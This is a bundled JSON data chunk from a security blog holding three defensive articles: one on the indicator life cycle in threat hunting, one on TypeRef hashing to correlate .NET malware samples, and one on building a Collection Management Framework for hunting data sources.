risks","permalink":"/jstnk9/blog/Threat-modeling-and-strategic-vision-of-risks"},"nextItem":{"title":"TypeRef Hasher- The imphash solution for samples in .NET","permalink":"/jstnk9/blog/TypeRef Hasher-The-imphash-solution-for-samples-in-NET"}},"content":"## TL;DR\\r\\n\\r\\nThe threat hunting process that currently exists can be used in parallel with another process called indicator life cycle.\\r\\n\\r\\nBoth cycles are based on the same, aiming at proactive detection of threats and behaviors in corporate networks, leaving aside the reactive approach which is increasingly being avoided.\\r\\n\\r\\nThis is because traditional incident response processes have a methodology based on working on an event that has taken place, whereas the indicator lifecycle and threat hunting process work from the perspective of working to prevent something from happening.\\r\\n\\r\\nDuring this blog I will explain the indicator lifecycle and how it can be used in parallel with the threat hunting process, also presenting a case study at the end.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Indicator life cycle\\r\\n\\r\\nIndicator life cycle is not intended to define how long an indicator is valid or not, since this depends on a large number of variables not controlled by analysts.\\r\\n\\r\\nThe objective of this cycle is to proactively use certain indicators to mature them and then automate new searches that may reveal other related indicators.\\r\\n\\r\\nAlthough the concept may initially seem a bit confusing, this cycle makes a lot of sense to apply it to threat hunting activities, as it is in these activities that maximum value can be derived.\\r\\n\\r\\nBefore going into detail about the explanation of this cycle, it is important to know what kind of indicators are valid for these operations, because nowadays, the term indicator is too ambiguous, not everyone understands the same thing by indicator.\\r\\n\\r\\nPersonally, I find the three differentiated concepts presented in the <a target=\\"_blank\\" href=\\"https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf\\"> Lockheed Martin Corporation </a> paper very useful. These concepts are as follows.\\r\\n\\r\\n* **Atomic indicators**: Atomic indicators are obtained based on the context of an intrusion that has taken place. The \u201cproblem\u201d with this type of indicators is that they do not have to be exclusive activity of a specific adversary, i.e. an atomic indicator can be identified in several intrusions of different adversaries. Some examples of these indicators are IP addresses, domains, the name of a path of a domain\u2026\\r\\n\\r\\n* **Computed indicators**: The concept of a calculated indicator is quite confusing. These indicators are developed from attributes that occur in an incident. For example, a hash of a file that has been seen in an incident can be calculated, so its MD5, SHA1\u2026 are calculated indicators. Another example could be a regular expression, which we can develop to detect something specific.\\r\\n\\r\\n* **behavioral indicators**: These indicators are composed of a combination of the two types described above. For example, within this category we could state the following; \u201cAdversaries established a C&C [IP and/or C&C domain] with the machine compromised by the [MD5 Hash] malware. Communications were executed at an interval of [Time interval] between client and server. They could be identified by searching for the regular expression [Identifying regular expression] in the proxy logs.\u201d\\r\\n\\r\\nAs you can imagine, this last type of indicator is the most valuable, as it has an associated context of what has happened and combines the atomic and calculated indicators. In addition, it is also easy to extract possible MITRE techniques and tactics to better understand what actions are being taken.\\r\\n\\r\\n![Image_1](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_1.png)\\r\\n\\r\\nNow that we know the types of indicators that can be used in the indicator life cycle process, it is time to explain how the indicator life cycle works.\\r\\n\\r\\nIt consists of three main phases or stages, being the phases of developed, matured and used. In addition, this process is essential to involve people, processes and technology, which makes it really dynamic and useful in different operations, such as threat hunting.\\r\\n\\r\\n![Image_2](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_2.png)\\r\\n\\r\\nApplying this model to our threat hunting activities will provide us with the following capabilities:\\r\\n\\r\\n1. Generate internal threat intelligence\\r\\n2. Implement a stable pivoting process\\r\\n3. Identify new indicators from other indicators\\r\\n\\r\\n### From revealed to mature\\r\\n\\r\\nThis first phase has different sources as input. In the image above, some of the sources that could be a source of information to start the cycle are shown. For example, external (or internal) reports, intelligence sources, SIEM or any other monitoring tool, such as an IDS.\\r\\n\\r\\nThe above mentioned sources will carry with them indicators, which should be subjected to an examination, which will consist of historically searching our available internal data sources to see whether or not such an indicator was observed in the past ( <a target=\\"_blank\\" href=\\"https://joseliyo-jstnk.medium.com/threat-hunting-but-where-and-what-collection-management-framework-33a2790f976f\\"> see my post about collection management framework </a> ). In case the result is positive, further investigation is required to determine whether the activity was malicious or not.\\r\\n\\r\\nWith a positive result, countermeasures for *detection* (in case the indicator becomes active again) and mitigation must be implemented internally, i.e., we **not only want to detect but also actively prevent it from achieving its objectives.**\\r\\n\\r\\n![Image_3](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_3.png)\\r\\n\\r\\nAn indicator is considered mature when malicious activity has been retrospectively identified and detection and mitigation countermeasures have been implemented.\\r\\n\\r\\n### From mature to utilized\\r\\n\\r\\nAn indicator is **utilized** when the detection countermeasures are positive, i.e. the indicator has been identified by performing some action and is considered to have been used to detect a possible scenario that in principle should be malicious.\\r\\n\\r\\nIt is therefore important that the indicators have detection countermeasures in place, otherwise they can never be considered used, thus breaking the cycle completely and being unable to identify new indicators.\\r\\n\\r\\n![Image_4](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_4.png)\\r\\n\\r\\n### From utilized to revealed\\r\\n\\r\\nThis stage of the cycle requires a great deal of interaction from the analysts as they will have to carry out an analysis of the events that have been detected in the previous stage. The reason is simple, the indicator itself is only a small portion of what could be an intrusion or attempt, i.e., it will be necessary to investigate the whole context of what could be happening and build a complete picture of the operation that the adversaries are carrying out.\\r\\n\\r\\nDuring this analysis, it is very likely that new indicators will appear that were not previously known, so these indicators will have to be moved to the disclosed state again to start the cycle.\\r\\n\\r\\n![Image_5](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_5.png)\\r\\n\\r\\nIn those cases where a large number of new indicators are identified, or regardless of the quantity, quality should be prioritized. This means that there will be indicators that have more impact and more clearly detect malicious activity. An example could be a domain path, assuming that a malware communicates with baddomain.com/data?systeminfo=value, it is possible that we have seen another domain communicating with the same path, either because the malware incorporates several hardcoded domains in its code or any other reason, so it would be important to mature indicators to detect new behavior of other communications with /data?systeminfo=.\\r\\n\\r\\n## Applying the cycle in threat hunting activities\\r\\n\\r\\nThe entire life cycle of the indicators explained so far has a place in the famous threat hunting process, where the team first performs hypothesis generation by prioritizing the threats that could have the greatest impact on its activity. The next step is the pure hunting activity, where the other cycle can be implemented to structure the work even more and achieve objectives in a more effective way.\\r\\n\\r\\n![Image_6](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_6.png)\\r\\n\\r\\nThe discovery phase could also be framed within the life cycle of the indicators, more specifically with the mature stage, which would be those cases where some past behavior has been detected with the hunt being carried out by the team.\\r\\n\\r\\n## Case study\\r\\n\\r\\nLet\u2019s imagine that we are generating different scenarios internally to carry out hunting activities.\\r\\n\\r\\n### #1 \u2014 Hypothesis generation\\r\\n\\r\\nWe are interested in identifying the creation of scheduled tasks in the systems in the past, because an adversary who has special motivation in our company\u2019s sector could materialize an incident.\\r\\n\\r\\n*Objective*: Identify suspicious scheduled tasks in the systems.\\r\\n\\r\\n*Searches*: Windows events 4698 and 4702.\\r\\n\\r\\n### #2 - Hunting\\r\\n\\r\\nThe team begins to perform threat hunting activities on the systems using whatever technology is available, be it EDR consoles, opensource tools, SIEM, etc\u2026\\r\\n\\r\\nA positive is identified in a system, where a scheduled task is checked.\\r\\n\\r\\n![Image_7](https://jstnk9.github.io/jstnk9/img/blog-indicator-life-cycle/hunt_7.png)\\r\\n\\r\\n### #3 - Revealed to mature\\r\\n\\r\\nThe finding in this case can be verified as a scheduled task masked with a name of \u201cMozilla Firefox Update\u201d has been enabled by launching via command line a file named \u201cjstnk.exe\u201d found in the AppData directory.\\r\\n\\r\\nAt this point we would have two indicators, a calculated one and a behavioral one.\\r\\n\\r\\n**Computed indicator**: MD5 hash of the file jstnk.exe\\r\\n\\r\\n**behavioral Indicator**: An adversary sets the scheduled task \u201cMozilla Firefox Update\u201d (T1053.005) which executes the file jstnk.exe [MD5].\\r\\n\\r\\nWith both indicators, it is necessary to check retrospectively whether similar persistence has been performed on other systems in the corporate network, either with the same malware called jstnk.exe or using the same scheduled task technique.\\r\\n\\r\\nIf new computers are detected where persistence has been performed using T1053.005, countermeasures for detection and mitigation are therefore implemented.\\r\\n\\r\\n**Detection countermeasures**: Execution of the command \u201cschtasks /create \u201c, focusing on files referenced in Appdata. A sigma rule similar to the following might be helpful -> https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml\\r\\n\\r\\n**Mitigation countermeasures**: Establish a policy to limit the use of schtasks in the system.\\r\\n\\r\\n### #4 - Mature to utilized\\r\\n\\r\\nIn this case, let\u2019s imagine that the detection countermeasure mentioned above has worked, and new findings of scheduled task creation are appearing on other systems.\\r\\n\\r\\nThese detections therefore mean that the indicator has been utilized.\\r\\n\\r\\n### #5 - Utilized to revealed\\r\\n\\r\\nAnalysts are starting to conduct research for alerts that have tested positive for creating scheduled tasks. What this triggers is that, it is becoming evident that the malware used for the persistence of this technique is different in all cases, but when the behavior is analyzed, many of the samples share infrastructure for communication with the C&Cs.\\r\\n\\r\\nAll these new indicators will go through the life cycle again to automate new detections and behaviors that may be related to the hunting being performed.\\r\\n\\r\\n### #6 \u2014 Discovery\\r\\n\\r\\nAs the findings are aligned with the hypotheses that were generated in the first step, this stage of the threat hunting process means that as much information about the TTPs that have been used at a low level as possible will need to be collected in order to automate or document the findings.\\r\\n\\r\\n### #7 \u2014 Report and enrichment\\r\\n\\r\\nFinally, the threat hunting process requires automating as much as possible the hunt mission carried out, so that the team does not waste time running the same mission every X amount of time and can focus their efforts on developing new missions for other techniques that may be being used in the corporate networks.\\r\\n\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"},{"id":"TypeRef Hasher-The-imphash-solution-for-samples-in-NET","metadata":{"permalink":"/jstnk9/blog/TypeRef Hasher-The-imphash-solution-for-samples-in-NET","source":"@site/blog/2021-02-10-TypeRef Hasher-The-imphash-solution-for-samples-in-NET/2021-02-10-TypeRef Hasher-The-imphash-solution-for-samples-in-NET.md","title":"TypeRef Hasher- The imphash solution for samples in .NET","description":"TL;DR","date":"2021-02-10T00:00:00.000Z","formattedDate":"February 10, 2021","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"malware","permalink":"/jstnk9/blog/tags/malware"},{"label":"reversing","permalink":"/jstnk9/blog/tags/reversing"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"imphash","permalink":"/jstnk9/blog/tags/imphash"},{"label":"typerefhasher","permalink":"/jstnk9/blog/tags/typerefhasher"}],"readingTime":6.695,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Indicator life cycle applied to threat hunting","permalink":"/jstnk9/blog/Indicator-life-cycle-applied-to-threat-hunting"},"nextItem":{"title":"Threat Hunting, but... Where and what? - Collection Management Framework","permalink":"/jstnk9/blog/Threat-hunting-but-where-and-what-collection-management-framework"}},"content":"## TL;DR\\r\\n\\r\\nLately I am analyzing many malware samples from different families written in C#, C++ and other languages based on the .NET framework (.NET assembly).\\r\\n\\r\\nThis has led me to find a problem when correlating different samples using hashing techniques, and that is that the imphash in a high percentage was always the same, even with different malware families, however, using other fuzzy hashing techniques I couldn\u2019t find any similarity.\\r\\n\\r\\nThe problem is due to the fact that during the compilation of the .NET programming languages, the source code is converted into Microsoft Intermediate Language (MSIL), which causes the same imphash to always exist, corresponding in some cases to the import of the **mscoree.dll** DLL and the **\\\\_CorExeMain** function.\\r\\n\\r\\nI have solved this problem by using another hashing tool called TypeRef Hasher developed by the folks at <a target=\\"_blank\\" href=\\"https://www.gdatasoftware.com/\\"> G Data CyberDefense</a>. This tool provides a solution to imphash only for .NET malware samples.\\r\\n\\r\\nTaking advantage of the CLI they have available on GitHub, I have developed a small solution that implements and complements it.\\r\\n\\r\\n\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Problem\\r\\n\\r\\nDuring the last months, analyzing malware samples that were compiled by some programming language in .NET, I always ran into the same imphash, which in many cases made me believe that I was crazy.\\r\\n\\r\\nI was seeing correlations where there weren\u2019t simply because imphash was always the same. For this reason, I started to investigate to see if imphash could really have some kind of bug and I could develop something to fix it, since imphash is one of the indicators I use (from a long list) to correlate malware and to help me later in the attribution processes.\\r\\n\\r\\n![Image_1](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_1.png)\\r\\n\\r\\nThe top part of the above image is an AsyncRAT sample which, as you can see, has the same imphash as the AgentTesla sample at the bottom (f34d5f2d4577ed6d9ceec516c1f5a744).\\r\\n\\r\\nRemembering how imphash works, the hash it produces is based on the DLLs, functions and the order of them in a PE. This fact was what definitely helped me to think that I was not crazy.\\r\\n\\r\\n![Image_2](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_2.png)\\r\\n\\r\\nBoth malware samples contain the same imported DLL (mscoree.dll) and the same function (\\\\_CorExeMain), which must have a reason for this behavior.\\r\\n\\r\\nLooking for information about the \\\\_CorExeMain function imported from the DLL in the Microsoft Documentation Center they indicate that it has the following functionality:\\r\\n\\r\\n1. Initialize the CLR (Common Language Runtime)\\r\\n2. Finds the entry point in the CLR header of the executable\\r\\n3. Normal PE execution begins\\r\\n\\r\\n![Image_3](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_3.png)\\r\\n\\r\\nTo summarize, a PE that has been compiled with .NET will have its Entry Point to the \\\\_CorExeMain() function of the mscoree.dll DLL, which will ensure that the CLR is loaded to execute the rest of the code.\\r\\n\\r\\nLater, at runtime, on demand, the PE will load the rest of the DLLs it needs, that is why in the first instance, the DLLs are not listed in the IAT.\\r\\n\\r\\n![Image_4](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_4.png)\\r\\n\\r\\n## Solution\\r\\n\\r\\nThe folks at G Data CyberDefense ran into the same problem as I did recently and came up with a very interesting development to solve this problem.\\r\\n\\r\\nThey have created a hash called TypeRefHash that is based on the TypeRef Table of PEs in .NET.\\r\\n\\r\\nThis table stores references to the imported namespaces, having a behavior very similar to that of the DLLs and their functions. For example, if in a PE the DLL Kernel32.dll is imported to make use of the WriteFile function, in a .NET PE the FileStream class of the System.IO namespace can be used.\\r\\n\\r\\n![Image_5](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_5.png)\\r\\n\\r\\nIn the previous image you can see part of the TypeRef table of the same AsyncRAT sample above, illustrating as an example how it performs the import of the System.IO namespace and the FileStream class.\\r\\n\\r\\nAll this table is finally used to build a hash (TypeRefHash) with the names and namespaces imported by the PE, something very similar to what imphash does with the DLLs.\\r\\n\\r\\nThe calculation of the SHA256 hash that they do is based on the following three steps that they indicate in their post.\\r\\n\\r\\n1. They sort the entries by TypeNameSpace and then by TypeName. This is very important, because this way if a new variant of a malware family changes the order of imports, it will not affect the final result of the hash calculation. Empty TypeNameSpaces will be the first to be sorted.\\r\\n2. Concatenate the TypeNamespace and TypeName with a dash. If the TypeNameSpace is empty, the concatenated string begins with the dash.\\r\\n3. All comma-separated strings are joined together and the SHA256 of the resulting UTF8 byte string is then calculated.\\r\\n\\r\\nAn example could be the following, which I wanted to illustrate in an image as a summary.\\r\\n\\r\\n![Image_6](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_6.png)\\r\\n\\r\\n## Neossins development\\r\\n\\r\\nBased on the G Data CyberDefense tool, I have developed a small application called Neossins in its 0.1 Alpha version, which I will be improving and implementing new features over time.\\r\\n\\r\\nThe objective pursued by Neossins is first of all to have a structured and comprehensive dataset of TypeRef Hashes on the main .NET malware families, having so far contemplated three:\\r\\n\\r\\n1. AsyncRAT\\r\\n2. Blackshades\\r\\n3. AgentTesla\\r\\n\\r\\nOnce the information is structured and stored in a database, the next step is to compare malware samples received from different sources with the dataset to identify if there is a match with any TypeRef Hash, and if so, to correlate other samples that have the same hash and that were previously stored in the database.\\r\\n\\r\\nUltimately, it is optimal that new matching samples are stored in the dataset, since the idea is to grow the dataset to be able to know as many TypeRef Hashes as possible for a malware family.\\r\\n\\r\\n![Image_7](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_7.jpeg)\\r\\n\\r\\nThe tool has been developed in python3 and has some dependencies such as Cytoscape for the generation of the graph that is displayed in a web application that is raised by Dash.\\r\\n\\r\\nIn a series of tests I have been performing using some downloaded malware samples related to AsyncRAT and AgentTesla, the result was the following.\\r\\n\\r\\n![Image_8](https://jstnk9.github.io/jstnk9/img/blog-typerefhasher/typeref_8.png)\\r\\n\\r\\nThe red rectangular nodes are all the samples that I deposited in the directory (the starting point) that must be set in the application\u2019s configuration file.\\r\\n\\r\\nStarting from the left side (blue zone), you can see that there are five nodes that all share the same TypeRef Hash, which could mean that they are variants belonging to the same family.\\r\\n\\r\\nIn the central part (red zone), there are three rectangular nodes of red color that are the samples selected to make a comparison with the AsyncRAT family, one of them is the one that has been seen in this post at the beginning of the whole. Two of the three samples, it can be seen that they have a large number of matches previously stored in the dataset, whose nodes are represented by pink circles. All these relationships between nodes means that they share the same TypeRef Hash.\\r\\n\\r\\nFinally, on the right side of the screen, seven orphan nodes that have no match with the dataset can be seen, which could be studied to verify if they could be the families mentioned by means of techniques other than TypeRef Hash, and if so, it would be convenient to store the samples in the dataset.\\r\\n\\r\\n## Conclusion\\r\\n\\r\\nThe TypeRef Hash solution is one more feature that can be used to identify malware variants on known families.\\r\\n\\r\\nAs I say and reiterate, it is not a definitive and unique solution to be used for the mentioned task, since it can be perfectly used in parallel with other techniques such as ssdeep, VT vhash, imphash for non-.NET files, etc\u2026\\r\\n\\r\\nThe use of imphash for samples compiled using .NET and incorporating only the mscoree.dll DLL and its corresponding \\\\_CorExeMain function, has no value since in most cases it will give a false positive in possible relationships of malware samples.\\r\\n\\r\\nLittle by little I will update Neossins until I have a stable version and incorporate new features that I want to implement in the future.\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**Github**: https://github.com/jstnk9/neossins\\r\\n\\r\\n**LinkedIn**: https://linkedin.com/in/joseluissm/"},{"id":"Threat-hunting-but-where-and-what-collection-management-framework","metadata":{"permalink":"/jstnk9/blog/Threat-hunting-but-where-and-what-collection-management-framework","source":"@site/blog/2020-04-22-Threat-hunting-but-where-and-what-collection-management-framework/2020-04-22-Threat-hunting-but-where-and-what-collection-management-framework.md","title":"Threat Hunting, but... Where and what? - Collection Management Framework","description":"TL;DR","date":"2020-04-22T00:00:00.000Z","formattedDate":"April 22, 2020","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"threat huting","permalink":"/jstnk9/blog/tags/threat-huting"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"process","permalink":"/jstnk9/blog/tags/process"},{"label":"CMF","permalink":"/jstnk9/blog/tags/cmf"}],"readingTime":8.88,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"TypeRef Hasher- The imphash solution for samples in .NET","permalink":"/jstnk9/blog/TypeRef Hasher-The-imphash-solution-for-samples-in-NET"}},"content":"## TL;DR\\r\\n\\r\\nOften DFIR teams must perform threat hunting actions to proactively identify anomalous behaviors in our networks or customers. However, on many occasions we do not know where to search or directly do not know which technologies we have to collect this information.\\r\\n\\r\\nA Collection Management Framework (CMF) can help us in these situations. This is based on which information each data source gives us and which of these sources are available for hunting.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Objective\\r\\n\\r\\nBefore talking about what is a CMF, it is important to explain in summarized form the real meaning, because the main job of the CMF is to support this work.\\r\\n\\r\\nThreat hunting is that activity that aims **to proactively** discover malicious activity of an actor or group of actors after the previous generation of hypotheses. Due to its a complex process, there are different maturity models to carry it out.\\r\\n\\r\\n![Image_1](https://jstnk9.github.io/jstnk9/img/blog-cmf/cmf_1.png)\\r\\n\\r\\nWithout going into much more detail about threat hunting because it is not the objective, more information about this activity and what each degree of maturity consists of can be found in the next <a target=\\"_blank\\" href=\\"https://medium.com/@sqrrldata/the-cyber-hunting-maturity-model-6d506faa8ad5\\"> entry in Sqrrl. </a>\\r\\n\\r\\nHaving already, organizations must be able to generate a CMF on that technology that they have and that the threat hunting team can consume to identify threats on the network. Otherwise, discovering threats will be such a tiring task that the team will not be able to meet the intelligence requirements that have been demanded of them.\\r\\n\\r\\nA CMF must be able to answer many of the questions that threat hunters ask themselves during their activity, such as:\\r\\n\\r\\n* Where do I get the data for hunting?\\r\\n* What data is available?\\r\\n* For how long is such data stored?\\r\\n* How can I consume the data?\\r\\n\\r\\n## Workflow\\r\\n\\r\\nOn many occasions, to carry out the threat hunting activity it is necessary to know what we are going to look for. In order to do this, you can generate hypotheses and work on them. However, in order to generate the hypotheses, we must know the threats that we face.\\r\\n\\r\\nIf we do not follow the last comments, we will be looking for something that we ourselves do not know about any generic threat that could not carry a risk for the company.\\r\\n\\r\\nAs an example, a possible flow to carry out threat hunting activities correctly with defined objectives would be the following:\\r\\n\\r\\n![Image_2](https://jstnk9.github.io/jstnk9/img/blog-cmf/cmf_2.png)\\r\\n\\r\\n**First of all, it is important to know our adversaries and prioritize those who may have more activity and motivations in the sector that the organization operates, since they pose more risk**. This work is done by Cyber Threat Intelligence teams.\\r\\n\\r\\nSomething that can help us in this case is a Threat Modeling, getting to see in a structured way those potential groups that could have interaction with us at any time. <a target=\\"_blank\\" href=\\"https://jstnk9.github.io/jstnk9/blog/Threat-modeling-and-strategic-vision-of-risks\\"> More information on threat modeling here. </a>\\r\\n\\r\\nSome of the information that we will obtain in the knowledge phase about the adversary could be the following:\\r\\n\\r\\n### TTPs\\r\\n\\r\\n**Tactics, techniques and procedures used by the actor or group of actors** that we intend to carry out hunting activities later.\\r\\n\\r\\nObtaining this information at a low level will later help the next two phases, therefore, it is highly recommended to map the tactics and techniques with the MITRE ATT&CK knowledge base in any of its variants (Enterprise, Mobile and PRE), in addition, they have just launch a beta that incorporates very comprehensive sub-techniques, more information about this <a target=\\"_blank\\" href=\\"https://medium.com/mitre-attack/attack-subs-what-you-need-to-know-99bce414ae0b\\"> here. </a>\\r\\n\\r\\n### Tradecraft\\r\\n\\r\\n**When we talk about tradecraft we mean the techniques, methods and technologies used by an adversary during an intrusion.** Although it may seem very similar to TTPs, tradecraft gives a different and more specific vision, but TTPs partially abstract us from the behavior.\\r\\n\\r\\nAn example of tradecraft could be when we talk about an adversary using spearphishing with an attached Word document and embedded macros. After the download and subsequent execution, it drops a RAT from the FlawedAmmyy family.\\r\\n\\r\\nAll this mentioned above, if we were to talk about TTPs, would remain in the MITER tactics and techniques at a high level, without going into detail of families.\\r\\n\\r\\n### Malware\\r\\n\\r\\n**These are all malicious capabilities developed by the actor or, failing that, reused from existing ones**. Know them is important, since it will later help in the generation of the scenario and execution by a red team. It is also possible to extract tactics and techniques from malware individually.\\r\\n\\r\\n### Software\\r\\n\\r\\nLike malware, when we refer to software, **we are talking about those capabilities that actors use during their intrusion but that are not considered malware**, since many of these capabilities are features that are incorporated into operating systems today (LOLBINs). To make this category clear, an example might be wscript.exe or cmd.exe.\\r\\n\\r\\nGeneration of hypotheses based on the selected adversaries would be the next activity that should be carried out and, as in the previous case, it is the responsibility of the Cyber Threat Intelligence team.\\r\\n\\r\\nOnce you are able to **know what your adversaries are, what TTPs they carry out during their operations, what malware and/or software they use and what motivations and objectives they are folllowing**, you have the ability to create a scenario to carry out against your organization.\\r\\n\\r\\nThese scenarios can be very similar to campaigns that have been carried out in the past, but above all, they must be realistic so that the red team can emulate them in a satisfactory way.\\r\\n\\r\\n**All this information should be collected in a report** that will be subsequently delivered to the red team to execute it, precisely in the next phase, which is the **scenario execution**.\\r\\n\\r\\nNowadays there are many tools that make the task of scenario emulation and detection easier in an automated way. From paid products like <a target=\\"_blank\\" href=\\"https://cymulate.com/\\">Cymulate</a> to open source tools like <a target=\\"_blank\\" href=\\"https://github.com/mitre/caldera\\">Caldera</a> and <a target=\\"_blank\\" href=\\"https://github.com/hunters-forge/mordor\\">Mordor</a> can help us in this case.\\r\\n\\r\\n**Any execution that is carried out will be under the responsibility of the red team**, which is in charge of carrying out the operations and subsequently testing the threat hunting team for detection.\\r\\n\\r\\n**Lastly, we are in the hunting phase, where the team must identify malicious activities that have been carried in the network** with the support of a previously generated CMF, thus achieving to know where to obtain the information they are looking for and what type of information is.\\r\\n\\r\\nHunting activities are completely linked to active defenses and it is important to know that there is a very significant factor here, humans, which means that automating this phase completely is not possible, however, there are certain aspects that They can help us, such as for example an alert generated by IDS, which could lead to a subsequent hunting process.\\r\\n\\r\\n## Collection Management Framework (CMF)\\r\\n\\r\\nAt this point, is time to start working on a CMF in order to make life easier for the threat hunting team. This work must be the result of a collaboration between different departments such as telecommunications, IT, architecture, security \u2026 Depending on each organization, there will be more or less team collaboration for the operations they carry out in their day to day.\\r\\n\\r\\nThe main objective of working at the CMF is to be able to have a list of all the technologies from which information can be obtained to carry out threat hunting activities and detect suspicious activities.\\r\\n\\r\\nAs mentioned before, it is important that the CMF can answer questions such as:\\r\\n\\r\\n* Where do I get the data for hunting?\\r\\n* What data is available?\\r\\n* For how long is such data stored?\\r\\n* How can I consume the data?\\r\\n\\r\\nFor this, we will define first what information we are interested in knowing for each data source available in the organization to do hunting. The good thing about this is that we can adapt it to our needs and incorporate or eliminate fields that do not interest us.\\r\\n\\r\\n* Type of data\\r\\n* Killing chain phase covering\\r\\n* Observable collection\\r\\n* Data storage time\\r\\n* Data storage location\\r\\n* Department owner\\r\\n* Data set\\r\\n* Category\\r\\n\\r\\nDefined the previous points, that we are going to fill in for each data source, it is time that we begin to identify those sources that during an intrusion, could give us information to be able to look for anomalies in the organization\u2019s network. As an example for this post, we will focus on the following data sources:\\r\\n\\r\\n* Firewall\\r\\n* Windows systems\\r\\n* IDS\\r\\n* Web logs\\r\\n\\r\\nDefined the fields that we are going to fill in and the data sources, it is time to get down to work and make a simple table that can help us like the following:\\r\\n\\r\\n![Image_3](https://jstnk9.github.io/jstnk9/img/blog-cmf/cmf_3.png)\\r\\n\\r\\nSimply with the information we have filled in in the table above, we can answer many questions in the event of an intrusion.\\r\\n\\r\\nIn case they have exploited a vulnerability of the web application, we will only have information to investigate 60 days ago, everything that happened after those days, the threat hunting team will not be able to satisfy an intelligence requirement.\\r\\n\\r\\nOn the contrary, if it has caused a network intrusion and establishes some type of communication with a C2, we could detect that behavior 90 days ago at best.\\r\\n\\r\\nOther information that the table can give us in this case is about those phases within the kill chain where we have less visibility. In this example, due to the type of data sources that we have collected, if an infection were to occur in an endpoint system and it were to persist, we would only have the logs of the Windows systems to cover the \u201cinstallation\u201d phase, since the rest of Data sources do not cover this phase.\\r\\n\\r\\nSo far, all the information we have discussed can be integrated into a platform that the people of Rabobank have developed called <a target=\\"_blank\\" href=\\"https://github.com/rabobank-cdc/DeTTECT\\">DeTTECT.</a>\\r\\n\\r\\nAs they say, the objective of the tool is to help blue teams based on a scoring established in ATT & CK to identify the quality, visibility and detection that an organization has in its registered data sources. At this point, with the information from the CMF, we could start working on this tool.\\r\\n\\r\\nTo better understand how this application works, I recommend watching the <a target=\\"_blank\\" href=\\"https://github.com/aboutsecurity/Talks-and-Presentations/blob/master/Modelado%20Practico%20de%20Amenazas%20y%20Defensas%20Blue%20Team%20con%20MITRE.pdf\\"> presentation and presentation by Ismael Valenzuela</a> where he gives practical examples of DeTTECT.\\r\\n\\r\\n## References\\r\\n\\r\\nThreat Hunting and Hunting Maturity Models \u2014 https://medium.com/@sqrrldata/the-cyber-hunting-maturity-model-6d506faa8ad5\\r\\n\\r\\nAdversary Emulation Plans \u2014 https://attack.mitre.org/resources/adversary-emulation-plans/\\r\\n\\r\\nCollection Management Frameworks \u2014 Beyond Asset Inventories for Preparing for and Responding to Cyber Threats \u2014 https://dragos.com/resource/collection-management-frameworks-beyond-asset-inventories-for-preparing-for-and-responding-to-cyber-threats/\\r\\n\\r\\n\\r\\n<br/><br/><br/>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"}]}')}}]);